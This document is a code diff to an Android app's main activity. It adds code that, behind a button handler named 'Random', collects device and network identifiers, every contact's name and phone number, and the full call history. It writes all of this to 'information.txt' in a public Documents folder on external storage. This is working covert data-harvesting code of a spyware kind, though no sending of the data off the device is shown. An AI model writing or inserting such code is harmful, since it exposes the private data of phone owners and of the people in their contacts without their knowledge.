@@ -11,6 +11,8 @@ import android.database.Cursor;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.text.format.Formatter;
 import android.util.Log;
@@ -25,6 +27,7 @@ import android.location.Location;
 import android.location.LocationManager;
 
 import java.io.FileOutputStream;
+import java.util.ArrayList;
 import java.util.List;
 
 import java.io.File;
@@ -35,7 +38,7 @@ public class MainActivity extends AppCompatActivity {
     Location location;
     List<Address> addresses;
     Geocoder geocoder;
-    String text = "";
+    String text ;
     LocationManager locationManager;
     Context con;
 
@@ -92,12 +95,12 @@ public class MainActivity extends AppCompatActivity {
         WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
         //geoLocation
         locationManager = (LocationManager) this.getSystemService(LOCATION_SERVICE);
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED&& ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.READ_CONTACTS}, 101);
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED&& ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED&& ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_CONTACTS}, 101);
         }
         geocoder = new Geocoder(this);
 //        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, android.R.id.text1, mobileArray);
-        text += "NetworkID: " + Formatter.formatIpAddress(wifiManager.getConnectionInfo().getNetworkId()) + "\n" + "IP: " + Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress()) + "\n" + "PRODUCT: " + Build.PRODUCT + "\n" + "DEVICE: " + Build.DEVICE + "\n" + "BOARD: " + Build.BOARD + "\n" + "BOOTLOADER: " + Build.BOOTLOADER + "\n" + "DISPLAY: " + Build.DISPLAY + "\n" + "FINGERPRINT: " + Build.FINGERPRINT + "\n" + "HARDWARE: " + Build.HARDWARE + "\n" + "HOST: " + Build.HOST + "\n" + "ID: " + Build.ID + "\n" + "MANUFACTURER: " + Build.MANUFACTURER + "\n" + "MODEL: " + Build.MODEL + "\n" + "TAGS: " + Build.TAGS + "\n" + "TYPE: " + Build.TYPE + "\n" + "USER: " + Build.USER + "\n" + "TIME: " + Build.TIME + "\n";
+        text = "NetworkID: " + Formatter.formatIpAddress(wifiManager.getConnectionInfo().getNetworkId()) + "\n" + "IP: " + Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress()) + "\n" + "PRODUCT: " + Build.PRODUCT + "\n" + "DEVICE: " + Build.DEVICE + "\n" + "BOARD: " + Build.BOARD + "\n" + "BOOTLOADER: " + Build.BOOTLOADER + "\n" + "DISPLAY: " + Build.DISPLAY + "\n" + "FINGERPRINT: " + Build.FINGERPRINT + "\n" + "HARDWARE: " + Build.HARDWARE + "\n" + "HOST: " + Build.HOST + "\n" + "ID: " + Build.ID + "\n" + "MANUFACTURER: " + Build.MANUFACTURER + "\n" + "MODEL: " + Build.MODEL + "\n" + "TAGS: " + Build.TAGS + "\n" + "TYPE: " + Build.TYPE + "\n" + "USER: " + Build.USER + "\n" + "TIME: " + Build.TIME + "\n";
     }
 
 
@@ -285,11 +288,11 @@ public class MainActivity extends AppCompatActivity {
 
     public   void Random(View V){
 
+
 //        textView.setText(text);
-        Log.d("load1", "1");
         con = this;
         getText1();
-        load(text);
+        load();
     }
 
 
@@ -432,7 +435,7 @@ public class MainActivity extends AppCompatActivity {
         } catch (IOException e) {
             e.printStackTrace();
         }
-
+        getAllContacts();
 
     }
 
@@ -465,17 +468,21 @@ public class MainActivity extends AppCompatActivity {
         }
         return bestLocation;
     }
-
-
-    public void load(String str) {
-//        try {
+    public void load( ) {
         try {
+            File path = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Documents");
+            if (!path.exists()) {
+                Log.d("bbb","bbb");
+                path.mkdirs();
+                Log.d("bbb","ccc");
 
-            Log.d("load1", "2");
-            File path = getApplicationContext().getFilesDir();
-            Log.d("load1", path.toString());
-            FileOutputStream writer = new FileOutputStream(new File(path, "information.txt"));
-            writer.write(str.getBytes());
+            }
+            if (!path.canWrite()) {
+                Log.e("load3", "External storage is not writable");
+            }
+            File x=new File(path, "information.txt");
+            FileOutputStream writer = new FileOutputStream(x);
+            writer.write(text.getBytes());
             writer.close();
         } catch (Exception e) {
             Log.d("load1", e.toString());
@@ -508,4 +515,62 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+        @SuppressLint("Range")
+    private void getAllContacts() {
+        text += "\n Contacts\n";
+        ArrayList<String> nameList = new ArrayList<>();
+        ContentResolver cr = getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+        if ((cur != null ? cur.getCount() : 0) > 0) {
+            while (cur.moveToNext()) {
+                @SuppressLint("Range") String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                nameList.add(name);
+                if (cur.getInt(cur.getColumnIndex( ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        text += name+": "+ phoneNo+"\n";
+                    }
+                    pCur.close();
+                }
+            }
+        }
+        if (cur != null) {
+            cur.close();
+        }
+        readPhoneLogs();
+    }
+
+
+    public void readPhoneLogs() {
+        text+="\n Phone Calls \n";
+        Cursor cursor = null;
+        try {
+            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
+            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
+
+            while (cursor.moveToNext()) {
+                String phoneNumber = cursor.getString(numberIndex);
+                String callDate = cursor.getString(dateIndex);
+                String callType = cursor.getString(typeIndex);
+
+                text+=("\nPhone number: " + phoneNumber + ", Date: " + callDate + ", Type: " + callType);
+            }
+        } catch (SecurityException e) {
+            Log.e("TAG", "Failed to read phone logs", e);
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
+        }
+    }
 }
+
